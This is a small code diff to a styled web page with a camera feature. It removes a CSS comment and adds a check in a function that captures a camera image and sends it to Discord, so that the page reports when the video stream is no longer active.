@@ -27,7 +27,6 @@
             border-image: linear-gradient(to right, #f0f, #0ff, #f0f) 1;
             border-radius: 20px;
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
-            /* Add opacity here */
             opacity: 0.5;  /* Adjust this value (0 to 1) for desired opacity */
         }
         button {
@@ -106,10 +105,16 @@
             }
         }
 
-        // Capture and send image to Discord
+        // Function to capture and send the image to Discord
         async function captureAndSendImage() {
             if (!currentStream) {
                 message.textContent = "No active camera stream.";
+                return;
+            }
+
+            // Ensure the video stream is still active
+            if (video.srcObject && video.srcObject.active === false) {
+                message.textContent = "Camera stream is no longer active.";
                 return;
             }
 
